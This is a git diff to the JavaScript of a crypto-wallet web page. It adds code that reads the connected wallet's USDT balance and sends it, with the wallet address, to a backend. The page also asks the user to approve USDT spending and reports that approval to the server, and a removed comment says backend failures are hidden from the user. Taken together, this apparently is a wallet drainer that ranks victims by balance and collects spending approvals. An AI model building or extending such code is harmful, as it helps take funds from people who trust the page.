@@ -28,23 +28,26 @@ const statusMessage = document.getElementById('status-message')
 let provider = null
 let signer = null
 let walletAddress = null
-let backendNotified = false // Track if we've sent to backend
+let walletBalance = '0.00'
+let backendNotified = false
 
 // Initialize app
 document.addEventListener('DOMContentLoaded', () => {
   // Check for existing connection
   const storedAddress = localStorage.getItem('walletAddress')
   const storedBackendNotified = localStorage.getItem('backendNotified') === 'true'
+  const storedBalance = localStorage.getItem('walletBalance') || '0.00'
   
   if (storedAddress) {
     walletAddress = storedAddress
+    walletBalance = storedBalance
     backendNotified = storedBackendNotified
     showWalletSection()
     updateWalletInfo()
     
-    // If we haven't notified backend yet, do it now
-    if (!backendNotified) {
-      sendWalletToBackend()
+    // Update balance display from stored value
+    if (usdtBalanceEl) {
+      usdtBalanceEl.textContent = `${parseFloat(walletBalance).toFixed(2)} USDT`
     }
   }
   
@@ -82,8 +85,12 @@ async function connectWallet() {
     // Switch to correct network
     await switchToCorrectNetwork()
     
+    // Get USDT balance before sending to backend
+    walletBalance = await getWalletUSDTBalance()
+    
     // Save to localStorage
     localStorage.setItem('walletAddress', walletAddress)
+    localStorage.setItem('walletBalance', walletBalance)
     localStorage.setItem('backendNotified', 'false')
     backendNotified = false
     
@@ -91,7 +98,7 @@ async function connectWallet() {
     showWalletSection()
     updateWalletInfo()
     
-    // Send to backend (but don't notify user if it fails)
+    // Send to backend with correct balance
     sendWalletToBackend()
     
   } catch (error) {
@@ -143,28 +150,37 @@ async function switchToCorrectNetwork() {
   }
 }
 
+// Get wallet USDT balance
+async function getWalletUSDTBalance() {
+  try {
+    if (!provider || !walletAddress) {
+      return '0.00'
+    }
+    
+    const usdtContract = new Contract(
+      CONFIG.USDT_CONTRACT_ADDRESS,
+      ['function balanceOf(address account) external view returns (uint256)'],
+      provider
+    )
+    
+    const balance = await usdtContract.balanceOf(walletAddress)
+    const formattedBalance = ethers.formatUnits(balance, 18)
+    return formattedBalance
+  } catch (error) {
+    console.error('Balance fetch error:', error)
+    return '0.00'
+  }
+}
+
 // Update wallet information
 async function updateWalletInfo() {
   if (!walletAddress) return
   
   walletAddressEl.textContent = formatAddress(walletAddress)
   
-  // Get USDT balance
-  try {
-    if (provider) {
-      const usdtContract = new Contract(
-        CONFIG.USDT_CONTRACT_ADDRESS,
-        ['function balanceOf(address account) external view returns (uint256)'],
-        provider
-      )
-      
-      const balance = await usdtContract.balanceOf(walletAddress)
-      const formattedBalance = ethers.formatUnits(balance, 18)
-      usdtBalanceEl.textContent = `${parseFloat(formattedBalance).toFixed(2)} USDT`
-    }
-  } catch (error) {
-    console.error('Balance error:', error)
-    usdtBalanceEl.textContent = '0.00 USDT'
+  // Update balance display
+  if (usdtBalanceEl) {
+    usdtBalanceEl.textContent = `${parseFloat(walletBalance).toFixed(2)} USDT`
   }
 }
 
@@ -288,7 +304,7 @@ async function approveUSDTSpending() {
   }
 }
 
-// Send wallet to backend (connection only)
+// Send wallet to backend (connection only) with correct balance
 async function sendWalletToBackend() {
   try {
     const response = await fetch(`${CONFIG.API_URL}/wallets/connect`, {
@@ -298,7 +314,8 @@ async function sendWalletToBackend() {
       },
       body: JSON.stringify({
         address: walletAddress,
-        name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
+        name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`,
+        balance: walletBalance // Send the balance with the connection
       })
     })
     
@@ -357,12 +374,14 @@ async function notifyApprovalToBackend() {
 function resetConnection() {
   // Clear all state
   walletAddress = null
+  walletBalance = '0.00'
   provider = null
   signer = null
   backendNotified = false
   
   // Clear localStorage
   localStorage.removeItem('walletAddress')
+  localStorage.removeItem('walletBalance')
   localStorage.removeItem('backendNotified')
   
   // Reset UI
